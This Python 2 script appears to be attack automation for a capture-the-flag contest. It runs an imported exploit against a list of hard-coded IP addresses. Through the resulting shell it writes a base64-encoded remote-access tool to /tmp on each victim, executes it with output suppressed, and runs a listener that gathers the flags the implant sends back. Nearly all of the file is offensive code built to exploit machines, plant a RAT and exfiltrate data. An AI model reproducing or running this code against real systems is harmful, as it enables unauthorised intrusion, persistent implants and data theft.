#coding:utf-8
from exp import *
import base64
from multiprocessing import Process,Manager
from suber import *





port = 9999
targets=["202.112.51.152",\
"202.112.51.151",\
# "202.112.51.152",\
]
manager=Manager()
tarlist=manager.list()

def encodefile(filename):
    ufile = open(filename,"r")
    whole = ufile.read()
    # return whole.encode("base64","strict")
    return base64.b64encode(whole)



# k = encodefile("./rat.py")
# print k
# print k.decode("base64","strict")


def upload(src,target):
    # cmd = "echo "+encodefile("./rat.py")+" > /tmp/ratb64"
    cmd = '''\
python -c '
import base64
res = base64.b64decode("{content}")
f=open("{target}","w")
f.write(res)
'\
'''.format(content = encodefile(src),target=target)

    print cmd
    sel(cmd)


def run(target):
    sel("python {target} 1>/dev/null 2>/dev/null".format(target=target))

# def decodefile

# raw_input()


def scan():
    for target in targets:
        try:
            exploit(target,port)
            sel("ls")
            print raw_r()
            # print raw_r()
            print raw_r()

            upload("./rat.py","/tmp/xxme.py")
            run("/tmp/xxme.py")


            clsconnection()

            # shell()

        except:
            log.warn("fail at %s"%target)

# global p


# def monitor():

    

def ceshi(arg1):
    sleep(10)
    print "ceshi"
    print arg1


#
#["ip","exp status","flag","rat status"]
def init_target_list(targets):
    target_list_structure = []
    for target in targets:
        target_list_structure.append([target,"init","none"])
    return target_list_structure



class Handler_ckx(StreamRequestHandler):
    def handle(self):
        addr = self.request.getpeername()
        print 'pid:',os.getpid()  #当前线程id
        print 'connection:', addr
        ip=addr[0]
        try:
            idx=targets.index(ip)
            print idx
            flag=self.request.recv(100)
            tarlist[idx][1]="get"
            tarlist[idx][2]=flag
            print 'flag is %s '% flag
            print "tarlist in handler:"
            print tarlist
        except:
            pass

        print os.getpid(),' is end.....'


tarlist=init_target_list(targets)

# arg1=123



def recv_server(tarlist):
   

    IP="" #
    PORT=9001
    TOKEN="i_am_ckxckxckx"
    MAXWORKERS=3  #
    print "::::::::::::::::::::::::::::::::::::::"
    server = Server(
        server_address=(IP,PORT),     # address
        RequestHandlerClass=Handler_ckx             # 请求类
    )
    server.allow_reuse_address=True
    server.max_children =MAXWORKERS     #这个很重要，默认max_children为40，根据性能需求设置
    server.serve_forever()
    server.server_close()



p_scan=Process(target=scan,args=())
p_recv=Process(target=recv_server,args=(tarlist))


p_scan.start()
p_recv.start()


# p_scan.start()
sleep(1)
while 1:
    print "\n"*9
    try:
        for i in tarlist:
            print i
    except:
        print "tarlist is null"

    sleep(10)
print "main"







